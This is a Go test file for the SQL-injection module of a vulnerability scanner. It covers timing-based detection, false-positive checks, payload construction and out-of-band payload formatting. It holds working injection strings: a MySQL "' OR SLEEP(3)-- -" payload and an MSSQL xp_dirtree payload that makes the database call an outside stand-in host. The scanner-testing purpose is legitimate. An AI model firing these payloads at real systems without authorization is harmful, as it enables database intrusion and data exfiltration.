package sqli

import (
	"context"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/stormbane-security/beacon/internal/finding"
	"github.com/stormbane-security/beacon/internal/module"
	"github.com/stormbane-security/beacon/internal/oob"
)

func TestSQLi_SkipsNonAuthorized(t *testing.T) {
	s := New()
	for _, st := range []module.ScanType{module.ScanSurface, module.ScanDeep} {
		findings, err := s.Run(context.Background(), "example.com", st)
		if err != nil {
			t.Fatal(err)
		}
		if len(findings) != 0 {
			t.Errorf("SQLi scanner should skip scan type %v", st)
		}
	}
}

func TestSQLi_DetectsTimeBased(t *testing.T) {
	// Create a server that sleeps when it sees SLEEP in the query parameter
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		param := r.URL.Query().Get("id")
		if strings.Contains(strings.ToUpper(param), "SLEEP(3)") {
			time.Sleep(3 * time.Second)
		} else if strings.Contains(strings.ToUpper(param), "SLEEP(5)") {
			time.Sleep(5 * time.Second)
		}
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("OK"))
	}))
	defer ts.Close()

	s := New()
	host := ts.Listener.Addr().String()
	findings, err := s.Run(context.Background(), host, module.ScanAuthorized)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) == 0 {
		t.Fatal("expected SQLi finding for vulnerable server")
	}

	f := findings[0]
	if f.CheckID != "web.sqli" {
		t.Errorf("expected check ID web.sqli, got %s", f.CheckID)
	}
	if f.Severity != finding.SeverityCritical {
		t.Errorf("expected critical severity, got %s", f.Severity)
	}

	// Verify evidence contains timing data
	if _, ok := f.Evidence["baseline_ms"]; !ok {
		t.Error("expected baseline_ms in evidence")
	}
	if _, ok := f.Evidence["sleep3_delta_ms"]; !ok {
		t.Error("expected sleep3_delta_ms in evidence")
	}
	if _, ok := f.Evidence["sleep5_delta_ms"]; !ok {
		t.Error("expected sleep5_delta_ms in evidence")
	}
}

func TestSQLi_NoFalsePositiveConstantTime(t *testing.T) {
	// Server with constant response time — should not trigger
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("OK"))
	}))
	defer ts.Close()

	s := New()
	host := ts.Listener.Addr().String()
	findings, err := s.Run(context.Background(), host, module.ScanAuthorized)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 0 {
		t.Errorf("expected 0 findings for constant-time server, got %d", len(findings))
	}
}

func TestSQLi_NoFalsePositiveJitter(t *testing.T) {
	// Server with random jitter (0-500ms) — should not trigger because
	// deltas won't consistently reach 2.5s+ and 4.5s+
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("OK"))
	}))
	defer ts.Close()

	s := New()
	host := ts.Listener.Addr().String()
	findings, err := s.Run(context.Background(), host, module.ScanAuthorized)
	if err != nil {
		t.Fatal(err)
	}

	if len(findings) != 0 {
		t.Errorf("expected 0 findings for jittery server, got %d", len(findings))
	}
}

func TestBuildPayload(t *testing.T) {
	p := payload{
		name:    "mysql-sleep-quote",
		dbType:  "mysql",
		prefix:  "' OR SLEEP(",
		sleepFn: "%d",
		suffix:  ")-- -",
	}

	got := buildPayload(p, 3)
	want := "' OR SLEEP(3)-- -"
	if got != want {
		t.Errorf("buildPayload() = %q, want %q", got, want)
	}

	got = buildPayload(p, 5)
	want = "' OR SLEEP(5)-- -"
	if got != want {
		t.Errorf("buildPayload(5) = %q, want %q", got, want)
	}
}

func TestMeasureBaseline(t *testing.T) {
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	defer ts.Close()

	client := &http.Client{Timeout: 5 * time.Second}
	baseline, err := measureBaseline(context.Background(), client, ts.URL, 5)
	if err != nil {
		t.Fatal(err)
	}

	// Baseline to localhost should be under 100ms
	if baseline > 100*time.Millisecond {
		t.Errorf("baseline %s seems too high for localhost", baseline)
	}
}

func TestTimeRequest(t *testing.T) {
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		time.Sleep(50 * time.Millisecond)
		w.WriteHeader(http.StatusOK)
	}))
	defer ts.Close()

	client := &http.Client{Timeout: 5 * time.Second}
	elapsed, err := timeRequest(context.Background(), client, ts.URL)
	if err != nil {
		t.Fatal(err)
	}

	if elapsed < 50*time.Millisecond {
		t.Errorf("expected at least 50ms, got %s", elapsed)
	}
}

func TestSQLi_OOBIntegration(t *testing.T) {
	// Verify OOB tokens are generated when server is available
	oobSrv := oob.NewServer("oob.test.com", "127.0.0.1:0")
	ctx := oob.WithOOB(context.Background(), oobSrv)

	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	defer ts.Close()

	s := New()
	host := ts.Listener.Addr().String()
	// Won't find anything (no actual SQLi) but should not panic
	findings, err := s.Run(ctx, host, module.ScanAuthorized)
	if err != nil {
		t.Fatal(err)
	}
	// No findings expected since server doesn't actually execute SQL
	_ = findings
}

func TestSQLi_OOBPayloadFormat(t *testing.T) {
	// Verify the MSSQL xp_dirtree OOB payload produces a valid UNC path,
	// not a BEL character (\a = 0x07).
	domain := "oob.example.com"

	// Reproduce the format string from the scanner
	mssqlPayload := fmt.Sprintf("'; EXEC master..xp_dirtree '\\\\\\\\%s\\\\a'-- -", domain)

	// The Go string should contain \\\\domain\\a (SQL-escaped UNC path).
	// When the SQL server interprets the string literal, \\\\ → \\, \\ → \,
	// producing the UNC path \\domain\a.
	wantSQLEscaped := `\\\\` + domain + `\\a`
	if !strings.Contains(mssqlPayload, wantSQLEscaped) {
		t.Errorf("MSSQL OOB payload should contain SQL-escaped UNC path %q, got: %q", wantSQLEscaped, mssqlPayload)
	}
	// Must NOT contain a BEL character (0x07)
	if strings.ContainsRune(mssqlPayload, 0x07) {
		t.Error("MSSQL OOB payload contains BEL character (0x07), expected literal backslash-a")
	}
}

func TestDetectScheme(t *testing.T) {
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	defer ts.Close()

	client := &http.Client{Timeout: 5 * time.Second}
	host := ts.Listener.Addr().String()

	scheme := detectScheme(context.Background(), client, host)
	if scheme != "http" {
		t.Errorf("expected http for httptest server, got %s", scheme)
	}
}
